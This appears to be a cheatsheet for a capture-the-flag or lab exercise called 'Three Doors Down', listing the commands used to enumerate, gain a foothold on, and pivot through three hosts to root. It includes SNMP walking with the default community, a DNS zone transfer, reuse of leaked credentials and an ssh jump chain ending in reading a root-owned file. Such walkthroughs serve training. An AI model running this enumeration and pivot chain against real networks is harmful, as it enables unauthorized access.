# Cheatsheet — Three Doors Down

## Targets

- **edge01** → **dmz01** → **vault01** — enum → foothold → pivot → root

## Useful commands

```bash
sudo nmap -sU --top-ports 200 <edge>
snmpwalk -v2c -c public <edge>               # read the WHOLE tree — extends leak
dig @<edge> corp.local axfr                  # zone + TXT records
ssh edgeop@<edge>                            # flag A

curl http://<dmz>/docs/                      # flag B + netplan.txt creds
ssh docmaster@<dmz>                          # pivot foothold

ssh -J docmaster@<dmz> vaultop@<vault>       # flag C chain
# or two steps: ssh docmaster@dmz → ssh vaultop@vault
sudo cat /root/vault.txt
```

## Concepts

- SNMP `extend` runs commands — their output is public enumeration surface
- Trust-boundary pivots: each hop's loot names the next hop's creds
- -J composes; on a jump the FIRST hop's creds differ from the last's
